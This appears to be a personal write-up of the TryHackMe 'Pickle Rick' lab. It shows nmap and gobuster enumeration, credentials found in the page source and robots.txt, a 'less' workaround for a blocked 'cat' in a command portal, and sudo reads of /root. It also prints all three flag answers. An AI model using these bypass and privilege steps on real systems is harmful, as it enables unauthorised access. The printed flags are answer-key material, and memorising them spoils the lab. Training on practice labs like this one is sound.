# Pickle Rick — TryHackMe

**Date:** May 2026  
**Difficulty:** Easy  
**Category:** Web, Linux  
**Status:** ✅ Completed  

---

## 🔍 Summary
Pickle Rick is an easy TryHackMe room focused on web enumeration and Linux command execution. The objective was to discover hidden credentials, gain access to Rick’s portal, and retrieve the three secret ingredients required to reverse Rick’s pickle experiment.

---

## 🛠️ Tools Used
- Nmap
- Gobuster
- Browser

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```



### Findings
- Port 22 — SSH
- Port 80 — HTTP

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |

---

## Website Enumeration

Browsing the website revealed a Rick and Morty themed page.

Viewing the page source exposed a hidden username:

```html
Username: R1ckRul3s
```

![Page Source](images/source.png)

---

## Robots.txt

Navigating to `/robots.txt` revealed a password:

```text
Wubbalubbadubdub
```

![Robots](images/robots.png)

---

## Gobuster Enumeration

```bash
gobuster dir -u http://MACHINE_IP \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html
```

![Gobuster](images/gobuster.png)

### Directories Found
- /login.php
- /portal.php
- /robots.txt

---

# 🔓 Exploitation

## Login

Using the discovered credentials:

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

I successfully logged into `/login.php`.

![Login Page](images/login.png)

---

## Command Execution

After authentication, the portal provided command execution capabilities.

Testing with:

```bash
ls
```

revealed:

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
```

![Command Panel](images/panel.png)

---

## First Ingredient

Attempting to use `cat` was blocked:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

Using `less` bypassed the restriction:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Output:

```text
mr. meeseek hair
```

![First Ingredient](images/flag1.png)

---

## Second Ingredient

Reading the clue:

```bash
less clue.txt
```

The clue suggested searching the filesystem.

Filesystem enumeration:

```bash
ls /
ls /home
ls /home/rick
```

Discovered file:

```text
second ingredients
```

Reading the file:

```bash
less /home/rick/"second ingredients"
```

Output:

```text
1 jerry tear
```

![Second Ingredient](images/flag2.png)

---

## Third Ingredient

Checking the root directory with sudo:

```bash
sudo ls /root
```

Discovered:

```text
3rd.txt
```

Reading the file:

```bash
sudo less /root/"3rd.txt"
```

Output:

```text
fleeb juice
```

![Third Ingredient](images/flag3.png)

---

# 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | Web Directory | `mr. meeseek hair` |
| Flag 2 | /home/rick | `1 jerry tear` |
| Flag 3 | /root | `fleeb juice` |

---

# 📚 Lessons Learned

- Practiced web enumeration techniques
- Learned to inspect HTML source code for hidden information
- Used Gobuster for directory brute forcing
- Explored Linux filesystem enumeration
- Learned command restriction bypass techniques
- Reinforced the importance of input sanitization and access control

---
